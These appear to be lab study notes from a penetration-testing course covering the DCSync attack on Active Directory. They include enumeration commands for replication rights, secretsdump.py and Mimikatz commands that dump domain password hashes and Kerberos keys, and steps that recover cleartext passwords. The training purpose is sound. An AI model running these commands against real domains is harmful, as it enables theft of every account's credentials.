
## What is DCSync and How Does it Work?

DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

#### Viewing adunn's Replication Privileges through ADSI Edit

![[adnunn_right_dcsync.png]]

#### Using Get-DomainUser to View adunn's Group Membership

	PS C:\htb> Get-DomainUser -Identity adunn |select samaccountname,objectsid,memberof,useraccountcontrol |fl

#### Using Get-ObjectAcl to Check adunn's Replication Rights

	PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" 
	PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py.

Running the tool as below will write all hashes to files with the prefix `inlanefreight_hashes`. The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.

#### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py

	AstraX01@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

#### Listing Hashes, Kerberos Keys, and Cleartext Passwords

	AstraX01@htb[/htb]$ ls inlanefreight_hashes*

#### Viewing an Account with Reversible Encryption Password Storage Set

![[reverse_encrypt.png]]

Tools such as `secretsdump.py` will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync.

#### Enumerating Further using Get-ADUser

	PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

We can see that one account, `proxyagent`, has the reversible encryption option set with PowerView as well:

#### Checking for Reversible Encryption Option using Get-DomainUser

	PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

#### Displaying the Decrypted Password

	AstraX01@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext

#### Using runas.exe

	C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell 
	Enter the password for INLANEFREIGHT\adunn: 
	Attempting to start powershell as user "INLANEFREIGHT\adunn" ...

#### Performing the Attack with Mimikatz

	PS C:\htb> .\mimikatz.exe

	mimikatz # privilege::debug 
	Privilege '20' OK 
	
	mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL

